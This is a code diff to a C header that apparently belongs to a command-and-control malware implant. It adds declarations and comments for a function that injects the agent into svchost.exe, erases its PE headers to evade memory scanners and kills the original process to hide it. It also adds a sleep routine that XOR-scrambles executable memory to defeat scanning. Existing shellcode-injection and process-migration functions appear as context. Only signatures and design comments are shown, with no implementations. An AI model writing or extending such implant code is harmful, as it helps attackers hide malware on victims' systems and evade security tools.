@@ -82,6 +82,29 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args);
  */
 void migrate_to_pid(TLS_CONTEXT *pTls, const char *args);
 
+/*
+ * auto_migrate
+ * ------------
+ * Called once at startup (before the C2 connect loop).
+ * Finds a suitable svchost.exe, injects a copy of this agent into it,
+ * erases the PE headers in the target to defeat memory scanners, then
+ * calls ExitProcess(0) so the original process disappears from Task Manager.
+ *
+ * Returns FALSE only if no suitable target was found or injection failed —
+ * in that case the agent continues running in the original process.
+ * On success this function never returns (ExitProcess is called).
+ */
+BOOL auto_migrate(const char *keyPath);
+
+/*
+ * obfuscate_sleep
+ * ---------------
+ * Sleeps for <ms> milliseconds while XOR-scrambling all private RX pages in
+ * this process so memory scanners see only ciphertext during the idle period.
+ * Falls back to plain Sleep() if BCryptGenRandom fails.
+ */
+void obfuscate_sleep(DWORD ms);
+
 #ifdef __cplusplus
 }
 #endif
